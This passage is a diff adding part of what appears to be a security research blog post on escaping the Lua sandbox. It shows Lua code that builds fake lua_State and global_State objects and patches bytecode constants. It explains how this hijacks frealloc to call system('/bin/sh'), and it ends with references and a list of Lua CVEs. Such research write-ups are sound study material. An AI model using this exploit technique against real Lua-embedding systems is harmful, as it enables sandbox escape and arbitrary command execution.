+  <span class="kd">local</span> <span class="n">t_buffer</span> <span class="o">=</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">t_addr</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span> <span class="c1">-- sizeof(lua_State)=200</span>
+
+  <span class="n">t_buffer</span> <span class="o">=</span> <span class="n">t_buffer</span><span class="p">:</span><span class="n">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">14</span><span class="p">)</span> <span class="o">..</span> <span class="s1">'</span><span class="se">\01\01</span><span class="s1">'</span> <span class="o">..</span> <span class="n">t_buffer</span><span class="p">:</span><span class="n">sub</span><span class="p">(</span><span class="mi">17</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span><span class="o">..</span> <span class="n">numTo64L</span><span class="p">(</span><span class="n">l_G_addr</span><span class="p">)</span> <span class="o">..</span> <span class="n">t_buffer</span><span class="p">:</span><span class="n">sub</span><span class="p">(</span><span class="mi">33</span><span class="p">)</span>
+
+  <span class="nb">collectgarbage</span><span class="p">()</span>
+  <span class="n">t_addr</span> <span class="o">=</span> <span class="n">bufferAddress</span><span class="p">(</span><span class="n">t_buffer</span><span class="p">)</span> <span class="c1">-- t_addr = &amp;fake_luaState</span>
+</code></pre></div></div>
+
+<p>After creating a <code class="language-plaintext highlighter-rouge">coroutine</code>, use the <code class="language-plaintext highlighter-rouge">thread</code> to get the address of <code class="language-plaintext highlighter-rouge">global_State</code> and copy as much as the size of <code class="language-plaintext highlighter-rouge">global_State</code> from the address to create a <code class="language-plaintext highlighter-rouge">fake global_State</code> string. After that, in the same way, the thread (<code class="language-plaintext highlighter-rouge">lua_State</code>) assigned to the variable <code class="language-plaintext highlighter-rouge">t</code> is copied to create the <code class="language-plaintext highlighter-rouge">fake lua_State</code> string. After that, the address to be executed is set to the location of <code class="language-plaintext highlighter-rouge">frealloc</code> of <code class="language-plaintext highlighter-rouge">fake global_State</code>, and the address of the first desired argument is set to the location of <code class="language-plaintext highlighter-rouge">ud</code>. Set the address of the <code class="language-plaintext highlighter-rouge">fake global_State</code> set in this way as the <code class="language-plaintext highlighter-rouge">l_G</code> variable of the <code class="language-plaintext highlighter-rouge">fake lua_State</code>.</p>
+
+<h3 id="call-frealloc">Call frealloc</h3>
+
+<p>We finish the exploit using the <code class="language-plaintext highlighter-rouge">fake lua_State</code> created in the <code class="language-plaintext highlighter-rouge">Fake Object</code> table of contents</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">local</span> <span class="n">g</span> <span class="o">=</span> <span class="k">function</span><span class="p">()</span> <span class="kd">local</span> <span class="n">a</span><span class="o">=</span><span class="s2">"a"</span> <span class="nb">coroutine.resume</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">end</span>
+
+  <span class="n">g</span> <span class="o">=</span> <span class="nb">string.dump</span><span class="p">(</span><span class="n">g</span><span class="p">)</span>
+
+  <span class="n">g</span> <span class="o">=</span> <span class="n">g</span><span class="p">:</span><span class="nb">gsub</span><span class="p">(</span><span class="err">escapeString</span><span class="p">(</span><span class="err">createLOADK</span><span class="p">(</span><span class="err">0</span><span class="p">,</span><span class="err">0</span><span class="p">)),</span>
+          <span class="n">escapeString</span><span class="p">(</span><span class="n">createLOADK</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">t_addr</span><span class="o">-</span><span class="n">k_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">16</span><span class="p">)))</span>
+
+  <span class="nb">collectgarbage</span><span class="p">()</span>
+
+  <span class="c1">-- clean tcache bins</span>
+
+  <span class="kd">local</span> <span class="n">t1</span> <span class="o">=</span> <span class="p">{}</span>
+  <span class="kd">local</span> <span class="n">t2</span> <span class="o">=</span> <span class="p">{}</span>
+  <span class="kd">local</span> <span class="n">t3</span> <span class="o">=</span> <span class="p">{}</span>
+  <span class="kd">local</span> <span class="n">t4</span> <span class="o">=</span> <span class="p">{}</span>
+  <span class="kd">local</span> <span class="n">t5</span> <span class="o">=</span> <span class="p">{}</span>
+  <span class="kd">local</span> <span class="n">t6</span> <span class="o">=</span> <span class="p">{}</span>
+  <span class="kd">local</span> <span class="n">t7</span> <span class="o">=</span> <span class="p">{}</span>
+
+  <span class="nb">collectgarbage</span><span class="p">()</span>
+
+  <span class="n">k</span><span class="o">=</span><span class="kc">nil</span>
+  <span class="nb">collectgarbage</span><span class="p">()</span>
+
+  <span class="n">g</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="nb">load</span><span class="p">(</span><span class="n">g</span><span class="p">)</span>
+  <span class="n">g</span><span class="p">()</span> 
+
+</code></pre></div></div>
+
+<p>We’ll use the same trick we used to do the AAR here after declaring the function <code class="language-plaintext highlighter-rouge">g</code>. During the operation of <code class="language-plaintext highlighter-rouge">g</code> using <code class="language-plaintext highlighter-rouge">string.dump</code>, <code class="language-plaintext highlighter-rouge">fake lua_State</code> is set as an argument of <code class="language-plaintext highlighter-rouge">coroutine.resume(a)</code> instead of a string. After that, <code class="language-plaintext highlighter-rouge">load(g)</code> is executed to call the <code class="language-plaintext highlighter-rouge">string.rep</code> function defined in function <code class="language-plaintext highlighter-rouge">f</code>. At this time, Lua internally allocates chunks for string creation. During this process, the global_State’s <code class="language-plaintext highlighter-rouge">frealloc</code> function is called, and the <code class="language-plaintext highlighter-rouge">global_State</code> referenced at this time is a <code class="language-plaintext highlighter-rouge">fake global_State</code> created by the attacker. So, instead of calling the normal <code class="language-plaintext highlighter-rouge">frealloc</code>, it calls system(“/bin/sh”) and the attacker can get the shell.</p>
+
+<h2 id="exploit-flow-schematic">Exploit flow schematic</h2>
+
+<p><img src="http://localhost:4000/images/previous-vulnerabilities/exploit_flow1.jpeg" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/images/previous-vulnerabilities/exploit_flow2.jpeg" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/images/previous-vulnerabilities/exploit_flow3.jpeg" alt="image-center" class="align-center" /></p>
+
+<h2 id="reference">Reference</h2>
+
+<ul>
+  <li><a href="https://github.com/erezto/lua-sandbox-escape">lua-5.2.4-sandbox-escape</a></li>
+  <li><a href="https://github.com/Lua-Project/lua-5.4.4-sandbox-escape">lua-5.4.4-sandbox-escape</a></li>
+  <li><a href="https://www.luac.nl/">lua-bytecode</a></li>
+  <li><a href="https://the-ravi-programming-language.readthedocs.io/en/latest/lua_bytecode_reference.html#">lua-5.3-Bytecode-Reference</a></li>
+  <li><a href="https://www.lua.org/pil/contents.html">Programming-in-Lua</a></li>
+  <li><a href="https://github.com/lua/lua">github-lua</a></li>
+  <li><a href="http://www.lua.org/manual/5.4/manual.html#pdf-string.gsub">string.gsub</a></li>
+  <li><a href="http://www.lua.org/manual/5.4/manual.html#pdf-string.dump">string.dump</a></li>
+</ul>
+
+<p><br /></p>
 <h1 id="2-cves-related-to-lua">2. CVEs related to Lua</h1>
 
+<p>There are 10 CVEs related to Lua. You can find them from <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-13641/LUA.html">this link</a>. The most recent one(CVE-2021-43519) is what we had got with our project. We analyzed all of the CVEs(except the recent one) to understand the internal structure of Lua. If you look in detail, you can figure out that most CVEs seem to be far from a critical issue. We made analysis documents for each CVEs.</p>
+
+<ul>
+  <li>CVE-2020-24371</li>
+  <li>CVE-2020-24370</li>
+  <li>CVE-2020-24369</li>
+  <li>CVE-2020-24342</li>
+  <li>CVE-2020-15945</li>
+  <li>CVE-2020-15889</li>
+  <li>CVE-2020-15888</li>
+  <li>CVE-2019-6706</li>
+  <li>CVE-2014-5461</li>
+</ul>
 
         </div>
 
